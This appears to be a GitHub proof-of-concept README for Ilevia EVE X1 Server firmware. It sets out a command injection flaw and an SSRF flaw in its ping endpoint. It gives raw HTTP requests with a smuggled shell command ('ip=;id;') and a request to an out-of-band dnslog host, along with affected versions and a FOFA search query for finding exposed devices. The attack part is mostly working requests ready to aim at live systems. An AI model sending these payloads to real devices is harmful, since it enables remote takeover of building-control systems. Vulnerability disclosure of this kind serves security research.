# ilevia-EVE-X1-Server
ilevia-EVE-X1-Server rce poc；ssrf

## Affected Repository
- Project: Ilevia EVE X1 Server 
- Affect versions: Firmware Version<= 4.7.18.0.eden;Logic Version<=6.00 - 2025_07_21
- File: /ajax/php/ping.php
- homePage: https://www.ilevia.com/
- Dependency: Ilevia EVE X1 Server ( Firmware Version<= 4.7.18.0.eden;Logic Version<=6.00 - 2025_07_21)

## Proof of Concept (PoC)
- rce
```
POST /ajax/php/ping.php HTTP/1.1
Host: 
Accept: */*
Origin: http://
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
content-type: application/x-www-form-urlencoded
Referer: http://ip/diagnostic/
Content-Length: 6

ip=;id;
```
<img width="1307" height="359" alt="image" src="https://github.com/user-attachments/assets/be1a6130-9a3f-4655-80be-80a89a3e5128" />
- ssrf

```
POST /ajax/php/ping.php HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
content-type: application/x-www-form-urlencoded
Content-Length: 6

ip=222.8emgy0.dnslog.cn
```
<img width="1301" height="484" alt="image" src="https://github.com/user-attachments/assets/6b6e044e-c5c3-4282-b9a4-7f7b9e5e3aaf" />
<img width="1162" height="268" alt="image" src="https://github.com/user-attachments/assets/9caa7358-1ccf-46e3-a5ae-baa2da7df74f" />

Front end code

```
function eveCanReachIP(strIP,callback){
	var eve = new eveRequest();
	eve.open("POST","/ajax/php/ping.php",true);
	eve.setRequestHeader("content-type","application/x-www-form-urlencoded");
	eve.onreadystatechange =
	function(){
		switch (eve.readyState) {
		  case 0 : // UNINITIALIZED
		  case 1 : // LOADING
		  case 2 : // LOADED
		  case 3 : // INTERACTIVE
		  break;
		  case 4 : // COMPLETED
			if(eve.status == 200){
				if(eve.responseText == "0"){
					callback(1,eve.responseText);
				}else{
					callback(0,eve.responseText);
				}
			}else{
				callback(1,"[" + eve.status + "][" + eve.responseText + "]");
			}
		  break;
		  default: callback(1,"[" + eve.status + "][" + eve.responseText + "]");
	   }
	}
	eve.send("ip=" + strIP);
}
```
<img width="744" height="388" alt="image" src="https://github.com/user-attachments/assets/44c7d517-1e9b-4bb9-b514-18ee511b1a67" />


## Vulnerability category
- CWE-78 OS Command Injection
- CWE-918 SSRF
## Scope of influence
- fofa：app="ilevia-EVE-X1-Server"
<img width="1482" height="340" alt="image" src="https://github.com/user-attachments/assets/2075aed5-76be-438a-a18e-e2e33380c26f" />
